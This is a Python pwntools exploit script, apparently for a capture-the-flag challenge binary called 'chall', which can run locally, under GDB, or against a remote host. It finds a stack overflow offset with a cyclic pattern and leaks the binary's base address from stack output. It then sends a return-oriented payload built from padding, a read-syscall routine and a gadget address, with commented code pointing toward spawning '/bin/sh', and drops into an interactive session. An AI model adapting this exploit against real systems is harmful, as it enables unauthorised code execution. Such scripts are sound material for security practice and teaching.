from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./chall"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *_error_not_int+26
    b *_main_loop
    b *skip_determine_len+10
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def exploit():
    offset = 520
    log.info("binary loaded")
    # leaking infos from the stack
    pp.recvuntil(b">")
    pp.sendline(b"1300")
    pp.recvuntil(b">")
    pp.sendline(b"k")
    # receiving
    elf.address = u64(pp.recvuntil(b"---")[39*8 +1 : 40*8 +1]) - 64
    print(f"{hex(elf.address)}")
    payload = flat(
        cyclic(offset),
        elf.sym.__LOAD_SYS_READ,
        elf.address + 0x0000000000001034,
        elf.sym._main_loop
        # elf.address + 0x000000000000114f,
            )
    pp.recvuntil(b">")
    pp.sendline(b"1200")
    pp.recvuntil(b">")
    pp.sendline(payload)
    # pp.sendline("a\x00")
    # pp.sendline(b"/bin/sh" + b"\x00" * (0x3b - 8))
    pp.interactive()

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
